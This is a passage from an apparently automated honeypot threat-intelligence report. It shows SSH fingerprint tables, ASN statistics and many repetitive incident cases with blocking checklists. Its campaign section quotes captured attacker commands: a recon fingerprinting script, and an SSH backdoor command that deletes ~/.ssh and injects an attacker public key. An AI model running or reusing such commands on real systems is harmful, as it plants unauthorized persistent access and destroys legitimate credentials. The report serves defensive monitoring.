| `0a07365cc01f...` | Generic scanner | 245 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 34 | 31 |
| `16443846184e...` | Generic scanner | 25 | 2 |
| `419da4c91ddb...` | Modern SSH client | 22 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 245 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 34 | 31 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 25 | 2 | Generic scanner |
| `419da4c91ddb...` | libssh | 22 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 10 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 9 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `104.243.42.167`, `186.96.158.180`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **50** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 7 | HIGH |
| `AS396982` | Google LLC | 5 | LOW |
| `AS9829` | National Internet Backbone | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS16010` | Magticom Ltd. | 2 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (354)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be9e3d0c1304

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:57 |
| **Last Seen** | 2026-08-20 18:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:57:04` | `cowrie.session.connect` |
| `2026-08-20 18:57:04` | `cowrie.client.version` |
| `2026-08-20 18:57:05` | `cowrie.client.kex` |
| `2026-08-20 18:57:08` | `cowrie.login.success` |
| `2026-08-20 18:57:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:57:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:57:15` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-288343a55c59

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:57 |
| **Last Seen** | 2026-08-20 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:57:21` | `cowrie.session.connect` |
| `2026-08-20 18:57:21` | `cowrie.client.version` |
| `2026-08-20 18:57:21` | `cowrie.client.kex` |
| `2026-08-20 18:57:23` | `cowrie.login.success` |
| `2026-08-20 18:57:23` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:57:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:57:23` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c98a9d0c4fa

| Field | Detail |
|---|---|
| **Source IP** | `175.207.225[.]36` |
| **First Seen** | 2026-08-20 19:08 |
| **Last Seen** | 2026-08-20 19:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:08:08` | `cowrie.session.connect` |
| `2026-08-20 19:08:09` | `cowrie.client.version` |
| `2026-08-20 19:08:09` | `cowrie.client.kex` |
| `2026-08-20 19:08:11` | `cowrie.login.success` |
| `2026-08-20 19:08:13` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.207.225[.]36` to AbuseIPDB if not already reported
- [ ] Block `175.207.225[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91910fa74a3

| Field | Detail |
|---|---|
| **Source IP** | `219.129.236[.]174` |
| **First Seen** | 2026-08-20 19:08 |
| **Last Seen** | 2026-08-20 19:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:08:19` | `cowrie.session.connect` |
| `2026-08-20 19:08:19` | `cowrie.client.version` |
| `2026-08-20 19:08:19` | `cowrie.client.kex` |
| `2026-08-20 19:08:23` | `cowrie.login.success` |
| `2026-08-20 19:08:23` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.236[.]174` to AbuseIPDB if not already reported
- [ ] Block `219.129.236[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e30b2b7dcc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:08 |
| **Last Seen** | 2026-08-20 19:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:08:29` | `cowrie.session.connect` |
| `2026-08-20 19:08:29` | `cowrie.client.version` |
| `2026-08-20 19:08:29` | `cowrie.client.kex` |
| `2026-08-20 19:08:34` | `cowrie.login.success` |
| `2026-08-20 19:08:34` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:08:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:08:41` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9444b4a9c334

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:08 |
| **Last Seen** | 2026-08-20 19:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:08:46` | `cowrie.session.connect` |
| `2026-08-20 19:08:46` | `cowrie.client.version` |
| `2026-08-20 19:08:46` | `cowrie.client.kex` |
| `2026-08-20 19:08:49` | `cowrie.login.success` |
| `2026-08-20 19:08:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:08:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:08:51` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a61c97812b14

| Field | Detail |
|---|---|
| **Source IP** | `175.43.162[.]214` |
| **First Seen** | 2026-08-20 19:16 |
| **Last Seen** | 2026-08-20 19:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:16:23` | `cowrie.session.connect` |
| `2026-08-20 19:16:23` | `cowrie.client.version` |
| `2026-08-20 19:16:23` | `cowrie.client.kex` |
| `2026-08-20 19:16:26` | `cowrie.login.success` |
| `2026-08-20 19:16:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.162[.]214` to AbuseIPDB if not already reported
- [ ] Block `175.43.162[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f94d66357b4

| Field | Detail |
|---|---|
| **Source IP** | `117.252.93[.]114` |
| **First Seen** | 2026-08-20 19:16 |
| **Last Seen** | 2026-08-20 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:16:38` | `cowrie.session.connect` |
| `2026-08-20 19:16:38` | `cowrie.client.version` |
| `2026-08-20 19:16:38` | `cowrie.client.kex` |
| `2026-08-20 19:16:40` | `cowrie.login.success` |
| `2026-08-20 19:16:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.252.93[.]114` to AbuseIPDB if not already reported
- [ ] Block `117.252.93[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8493e713ef5f

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-08-20 19:19 |
| **Last Seen** | 2026-08-20 19:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:19:59` | `cowrie.session.connect` |
| `2026-08-20 19:20:01` | `cowrie.client.version` |
| `2026-08-20 19:20:01` | `cowrie.client.kex` |
| `2026-08-20 19:20:04` | `cowrie.login.success` |
| `2026-08-20 19:20:05` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026549a73f7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:20 |
| **Last Seen** | 2026-08-20 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:20:01` | `cowrie.session.connect` |
| `2026-08-20 19:20:01` | `cowrie.client.version` |
| `2026-08-20 19:20:01` | `cowrie.client.kex` |
| `2026-08-20 19:20:05` | `cowrie.login.success` |
| `2026-08-20 19:20:07` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:20:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:20:08` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11a7b863141

| Field | Detail |
|---|---|
| **Source IP** | `117.247.77[.]115` |
| **First Seen** | 2026-08-20 19:20 |
| **Last Seen** | 2026-08-20 19:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:20:07` | `cowrie.session.connect` |
| `2026-08-20 19:20:08` | `cowrie.client.version` |
| `2026-08-20 19:20:08` | `cowrie.client.kex` |
| `2026-08-20 19:20:10` | `cowrie.login.success` |
| `2026-08-20 19:20:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.77[.]115` to AbuseIPDB if not already reported
- [ ] Block `117.247.77[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c7f7b19ce7

| Field | Detail |
|---|---|
| **Source IP** | `178.132.144[.]161` |
| **First Seen** | 2026-08-20 19:20 |
| **Last Seen** | 2026-08-20 19:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:20:10` | `cowrie.session.connect` |
| `2026-08-20 19:20:10` | `cowrie.client.version` |
| `2026-08-20 19:20:10` | `cowrie.client.kex` |
| `2026-08-20 19:20:11` | `cowrie.login.success` |
| `2026-08-20 19:20:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.132.144[.]161` to AbuseIPDB if not already reported
- [ ] Block `178.132.144[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938ec058f668

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:20 |
| **Last Seen** | 2026-08-20 19:20 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:20:17` | `cowrie.session.connect` |
| `2026-08-20 19:20:18` | `cowrie.client.version` |
| `2026-08-20 19:20:18` | `cowrie.client.kex` |
| `2026-08-20 19:20:20` | `cowrie.login.success` |
| `2026-08-20 19:20:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:20:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:20:47` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f649c919a5d5

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]207` |
| **First Seen** | 2026-08-20 19:20 |
| **Last Seen** | 2026-08-20 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:20:18` | `cowrie.session.connect` |
| `2026-08-20 19:20:19` | `cowrie.client.version` |
| `2026-08-20 19:20:19` | `cowrie.client.kex` |
| `2026-08-20 19:20:22` | `cowrie.login.success` |
| `2026-08-20 19:20:22` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]207` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6374c5589176

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-08-20 19:25 |
| **Last Seen** | 2026-08-20 19:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:25:24` | `cowrie.session.connect` |
| `2026-08-20 19:25:25` | `cowrie.client.version` |
| `2026-08-20 19:25:25` | `cowrie.client.kex` |
| `2026-08-20 19:25:27` | `cowrie.login.success` |
| `2026-08-20 19:25:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c876dc688d53

| Field | Detail |
|---|---|
| **Source IP** | `185.40.122[.]250` |
| **First Seen** | 2026-08-20 19:25 |
| **Last Seen** | 2026-08-20 19:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:25:35` | `cowrie.session.connect` |
| `2026-08-20 19:25:35` | `cowrie.client.version` |
| `2026-08-20 19:25:36` | `cowrie.client.kex` |
| `2026-08-20 19:25:40` | `cowrie.login.success` |
| `2026-08-20 19:25:40` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.122[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.40.122[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25964acfc745

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:09` | `cowrie.session.connect` |
| `2026-08-20 19:26:09` | `cowrie.client.version` |
| `2026-08-20 19:26:09` | `cowrie.client.kex` |
| `2026-08-20 19:26:10` | `cowrie.login.success` |
| `2026-08-20 19:26:11` | `cowrie.session.params` |
| `2026-08-20 19:26:11` | `cowrie.command.input` |
| `2026-08-20 19:26:11` | `cowrie.log.closed` |
| `2026-08-20 19:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe455e37d1c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:10` | `cowrie.session.connect` |
| `2026-08-20 19:26:10` | `cowrie.client.version` |
| `2026-08-20 19:26:10` | `cowrie.client.kex` |
| `2026-08-20 19:26:14` | `cowrie.login.success` |
| `2026-08-20 19:26:15` | `cowrie.session.params` |
| `2026-08-20 19:26:15` | `cowrie.command.input` |
| `2026-08-20 19:26:17` | `cowrie.log.closed` |
| `2026-08-20 19:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7362281451

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:11` | `cowrie.session.connect` |
| `2026-08-20 19:26:11` | `cowrie.client.version` |
| `2026-08-20 19:26:11` | `cowrie.client.kex` |
| `2026-08-20 19:26:12` | `cowrie.login.success` |
| `2026-08-20 19:26:13` | `cowrie.session.params` |
| `2026-08-20 19:26:13` | `cowrie.command.input` |
| `2026-08-20 19:26:14` | `cowrie.log.closed` |
| `2026-08-20 19:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cabadef44898

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:11` | `cowrie.session.connect` |
| `2026-08-20 19:26:11` | `cowrie.client.version` |
| `2026-08-20 19:26:12` | `cowrie.client.kex` |
| `2026-08-20 19:26:12` | `cowrie.login.success` |
| `2026-08-20 19:26:17` | `cowrie.session.params` |
| `2026-08-20 19:26:17` | `cowrie.command.input` |
| `2026-08-20 19:26:17` | `cowrie.log.closed` |
| `2026-08-20 19:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f485bedeed9

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:12` | `cowrie.session.connect` |
| `2026-08-20 19:26:12` | `cowrie.client.version` |
| `2026-08-20 19:26:12` | `cowrie.client.kex` |
| `2026-08-20 19:26:17` | `cowrie.login.success` |
| `2026-08-20 19:26:18` | `cowrie.session.params` |
| `2026-08-20 19:26:18` | `cowrie.command.input` |
| `2026-08-20 19:26:19` | `cowrie.log.closed` |
| `2026-08-20 19:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f323fce95c25

